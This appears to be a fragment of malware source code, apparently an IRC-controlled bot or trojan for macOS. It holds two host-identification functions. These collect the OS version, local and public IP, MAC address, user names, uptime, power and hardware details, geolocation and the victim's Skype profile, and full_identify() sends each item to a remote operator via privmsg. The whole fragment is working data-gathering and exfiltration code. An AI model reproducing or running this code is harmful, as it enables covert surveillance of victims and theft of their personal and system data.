# -*- coding: utf-8 -*-

def identify():                                                   # give some identifying info about the host computer
    log('[+] Running v%s Identification Modules...' % version)
    system = platform.mac_ver()[0]
    if len(str(system)) < 1:
        system = platform.platform()
        log('[>]    System:    ',system)
    else:
        log('[>]    OS X:    ',system)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
    local_ip = s.getsockname()[0]
    s.close()
    log('[>]    Local:   ',local_ip)
    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ',mac_addr)
    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
 
def full_identify():                                              # give verbose identifying info about the host computer
    log('[+] Running v%s Identification Modules...' % version)
    privmsg('[+] Running v%s Identification Modules...' % version)
    system = platform.mac_ver()[0]
    if len(str(system)) < 1:
        system = platform.platform()
        log('[>]    System:    ',system)
        privmsg('[>]      System:    %s' % system)
    else:
        log('[>]    OS X:    ',system)
        privmsg('[>]      OS X:    %s' % system)

    log('[>]    Bot:    ',local_user)
    privmsg('[>]      Bot:    %s' % local_user)

    log('[>]    User:    ',main_user)
    privmsg('[>]      User:    %s' % main_user)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
    local_ip = s.getsockname()[0]
    s.close()
    log('[>]    Local:   ',local_ip)
    privmsg('[>]      Local:   %s' % local_ip)

    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    privmsg('[>]      Public:  %s' % public_ip)
    
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ',mac_addr)
    privmsg('[>]      MAC:     %s' % mac_addr)
    
    cmd = "system_profiler SPPowerDataType | grep Connected"
    for line in run_shell(cmd):
        log('[>]    Power:    ',line)
        privmsg('[>]      Power:    %s' % line)
    
    cmd = "uptime"
    for line in run_shell(cmd):
        log('[>]    UP:    ',line)
        privmsg('[>]      Up:    %s' % line)

    geo_info = geo_locate()
    location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"

    log('[>]    Geoip:    ',location)
    privmsg('[>]      Location:    %s' % location)

    try:
        db_path = skype.findProfile(local_user)
        log('[>]    Skype:    ')
        privmsg('[>]      Skype:')
        for line in skype.printProfile(db_path):
            log('[>]              ',line)
            privmsg('[>]         %s' % line)
            sleep(1)
    except:
        log('[>]    Skype:    None Found.')
        privmsg('[>]      Skype:    None Found.')
    
    cmd = "system_profiler SPHardwareDataType"
    log('[>]    CMD:     ',cmd)
    p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
    hardware = p.stdout.read()
    log('[>]    Hardware.')
    privmsg(str(hardware))
    
    privmsg('[√] Done.')